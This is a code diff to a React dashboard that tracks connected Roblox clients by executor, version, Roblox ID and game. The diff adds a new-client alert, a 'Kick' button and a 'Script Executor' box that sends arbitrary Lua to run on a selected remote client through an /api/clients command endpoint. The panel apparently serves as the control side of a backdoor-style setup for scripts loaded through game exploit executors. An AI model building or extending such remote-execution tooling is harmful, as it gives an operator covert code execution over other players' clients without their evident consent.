@@ -98,6 +98,14 @@ export default function Track() {
   const [totalConnections, setTotalConnections] = useState(0);
   const [accessDenied, setAccessDenied] = useState(false);
   const [accessChecked, setAccessChecked] = useState(false);
+  const [newClientAlert, setNewClientAlert] = useState(false);
+  const [prevClientIds, setPrevClientIds] = useState<Set<string>>(new Set());
+
+  // Script executor state
+  const [scriptInput, setScriptInput] = useState("");
+  const [scriptSending, setScriptSending] = useState(false);
+  const [scriptStatus, setScriptStatus] = useState<"idle" | "sent" | "error">("idle");
+  const [kickSending, setKickSending] = useState(false);
 
   // IP check on mount
   useEffect(() => {
@@ -173,6 +181,13 @@ export default function Track() {
         if (res.ok) {
           const data: Client[] = await res.json();
           setClients(data);
+          // Notification dot for new clients
+          const newIds = new Set(data.map((c: Client) => c.robloxId || c.id));
+          if (prevClientIds.size > 0) {
+            const hasNew = data.some((c: Client) => !prevClientIds.has(c.robloxId || c.id));
+            if (hasNew) setNewClientAlert(true);
+          }
+          setPrevClientIds(newIds);
           const newUptimes: Record<string, number> = {};
           data.forEach(c => { newUptimes[c.id] = c.uptime || 0; });
           setClientUptimes(prev => ({ ...prev, ...newUptimes }));
@@ -240,6 +255,15 @@ export default function Track() {
 
   function selectClient(c: Client) { setSelectedClient(c); setInClientMode(true); }
   function chipClick() { setInClientMode(false); setHomeView("clients"); }
+
+  async function sendCommand(robloxId: string, type: string, script = "") {
+    const res = await fetch("/api/clients?command=1", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ robloxId, type, script }),
+    });
+    return res.ok;
+  }
 
   const topbarLabel = inClientMode ? (selectedClient?.name || "Client") : homeNav.find(n => n.id === homeView)?.label ?? "";
 
@@ -331,9 +355,12 @@ export default function Track() {
           <nav className="sidebar-nav">
             {homeNav.map(n => (
               <button key={n.id} className={`sidebar-item ${homeView === n.id && !inClientMode ? "active" : ""}`}
-                onClick={() => { setHomeView(n.id); setInClientMode(false); setSelectedUser(null); setSelectedKey(null); }}>
+                onClick={() => { setHomeView(n.id); setInClientMode(false); setSelectedUser(null); setSelectedKey(null); if (n.id === "clients") setNewClientAlert(false); }}>
                 <i className={`ti ${n.icon}`}></i>
                 {n.label}
+                {n.id === "clients" && newClientAlert && (
+                  <div style={{ width: 7, height: 7, borderRadius: "50%", background: "#22c55e", marginLeft: "auto", flexShrink: 0 }}></div>
+                )}
               </button>
             ))}
           </nav>
@@ -747,7 +774,22 @@ export default function Track() {
                 <div style={{ display: "flex", gap: "32px", alignItems: "center" }}>
                   {selectedClient.placeId && <GameIcon placeId={selectedClient.placeId} size={140} />}
                   <div style={{ flex: 1 }}>
-                    <div style={{ fontSize: "26px", fontWeight: "700", marginBottom: "16px" }}>{selectedClient.place || "Unknown Game"}</div>
+                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "16px" }}>
+                      <div style={{ fontSize: "26px", fontWeight: "700" }}>{selectedClient.place || "Unknown Game"}</div>
+                      <button
+                        disabled={kickSending}
+                        onClick={async () => {
+                          if (!confirm(`Kick ${selectedClient.name}?`)) return;
+                          setKickSending(true);
+                          await sendCommand(selectedClient.robloxId || "", "kick");
+                          setKickSending(false);
+                          setTimeout(() => { setInClientMode(false); setHomeView("clients"); }, 500);
+                        }}
+                        style={{ display: "flex", alignItems: "center", gap: "6px", background: "var(--bg-danger)", border: "1px solid rgba(224,104,104,0.3)", borderRadius: "8px", padding: "8px 16px", color: "var(--text-danger)", fontSize: "13px", fontWeight: "600", cursor: "pointer", opacity: kickSending ? 0.5 : 1 }}
+                      >
+                        <i className="ti ti-user-x"></i> {kickSending ? "Kicking..." : "Kick"}
+                      </button>
+                    </div>
                     <div style={{ display: "flex", gap: "48px", flexWrap: "wrap" }}>
                       <div>
                         <div style={label()}>Player</div>
@@ -762,11 +804,24 @@ export default function Track() {
                       </div>
                       <div>
                         <div style={label()}>Executor</div>
-                        <div style={{ fontSize: "20px", fontWeight: "600" }}>{selectedClient.executor || "Unknown"}</div>
+                        <div style={{ fontSize: "20px", fontWeight: "600" }}>
+                          {selectedClient.executor || "Unknown"}
+                          {(selectedClient as any).executorVersion && <span style={{ fontSize: "13px", color: "var(--text-tertiary)", marginLeft: "6px" }}>v{(selectedClient as any).executorVersion}</span>}
+                        </div>
                       </div>
                       <div>
                         <div style={label()}>Roblox ID</div>
-                        <div style={{ fontSize: "20px", fontWeight: "600" }}>{selectedClient.robloxId || "N/A"}</div>
+                        <div style={{ fontSize: "20px", fontWeight: "600", display: "flex", alignItems: "center", gap: "8px" }}>
+                          {selectedClient.robloxId || "N/A"}
+                          {selectedClient.robloxId && (
+                            <button onClick={() => { navigator.clipboard.writeText(selectedClient.robloxId || ""); }}
+                              style={{ background: "none", border: "none", cursor: "pointer", color: "var(--text-tertiary)", padding: "2px", borderRadius: "4px" }}
+                              title="Copy Roblox ID"
+                            >
+                              <i className="ti ti-copy" style={{ fontSize: "14px" }}></i>
+                            </button>
+                          )}
+                        </div>
                       </div>
                     </div>
                   </div>
@@ -788,6 +843,40 @@ export default function Track() {
                 <div style={card({ padding: "20px" })}>
                   <div style={label()}>Session Start</div>
                   <div style={{ fontSize: "16px", fontWeight: "600" }}>{new Date(Date.now() - (clientUptimes[selectedClient.id] || 0) * 1000).toLocaleTimeString()}</div>
+                </div>
+              </div>
+
+              {/* Script Executor */}
+              <div style={card({ padding: "24px" })}>
+                <div style={{ fontSize: "14px", fontWeight: "600", marginBottom: "14px", display: "flex", alignItems: "center", gap: "8px" }}>
+                  <i className="ti ti-terminal" style={{ color: "#4ade80" }}></i>
+                  Script Executor
+                </div>
+                <textarea
+                  value={scriptInput}
+                  onChange={e => setScriptInput(e.target.value)}
+                  placeholder="-- Enter Lua script to execute on this client..."
+                  style={{ width: "100%", height: "120px", background: "var(--bg-tertiary)", border: "1px solid var(--border)", borderRadius: "8px", padding: "12px", color: "var(--text-primary)", fontFamily: "var(--font-mono)", fontSize: "13px", resize: "vertical", outline: "none" }}
+                />
+                <div style={{ display: "flex", alignItems: "center", gap: "10px", marginTop: "10px" }}>
+                  <button
+                    disabled={scriptSending || !scriptInput.trim()}
+                    onClick={async () => {
+                      setScriptSending(true);
+                      setScriptStatus("idle");
+                      const ok = await sendCommand(selectedClient.robloxId || "", "execute", scriptInput);
+                      setScriptStatus(ok ? "sent" : "error");
+                      setScriptSending(false);
+                      if (ok) setScriptInput("");
+                      setTimeout(() => setScriptStatus("idle"), 3000);
+                    }}
+                    style={{ display: "flex", alignItems: "center", gap: "6px", background: "#22c55e", color: "#000", border: "none", borderRadius: "8px", padding: "10px 20px", fontWeight: "600", fontSize: "13px", cursor: "pointer", opacity: scriptSending || !scriptInput.trim() ? 0.5 : 1 }}
+                  >
+                    <i className="ti ti-player-play"></i>
+                    {scriptSending ? "Sending..." : "Execute"}
+                  </button>
+                  {scriptStatus === "sent" && <span style={{ fontSize: "13px", color: "#4ade80" }}>✓ Script sent</span>}
+                  {scriptStatus === "error" && <span style={{ fontSize: "13px", color: "var(--text-danger)" }}>✗ Failed to send</span>}
                 </div>
               </div>
 
